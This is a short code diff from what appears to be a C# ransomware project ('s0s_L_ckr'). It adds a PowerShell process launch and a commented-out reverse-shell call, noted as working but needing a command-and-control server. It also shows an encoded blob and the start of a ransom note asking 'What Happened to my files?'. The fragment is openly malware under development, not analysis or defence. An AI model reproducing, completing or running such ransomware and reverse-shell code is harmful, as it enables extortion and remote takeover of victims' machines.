@@ -19,6 +19,15 @@ namespace s0s_L_ckr
     {
         static int Main(string[] args)
         {
+            Process process = new Process();
+            process.StartInfo.FileName = "powershell.exe";
+            process.StartInfo.Arguments = "-c\"Start-Sleep -s 10\"";
+            Process process1 = new Process();
+           // process1.StartInfo.FileName = "powershell.exe";
+            process.Start();
+
+            //Reverse shell works. Needs a C&C
+            // Comn.RevShell.StartShell();
             //var recoByt = Convert.FromBase64String("3EstYvSXUTv1MBpAVIzSV4SVzmA47AEAaW8BH90c481lcVM2YPfTzqiCOEWoKgqYcJqNrijoKa5hqfJfE");
             var recoMess = "Ransom Note: \n \tWhat Happened to my files? \n" +
                 "20qUdZOQZw0iatnMEH4ZzM6ZUYiGVhlwFCEl5CaQeQkuFQ5A5vQeKaIe12gt0kosuiil" +
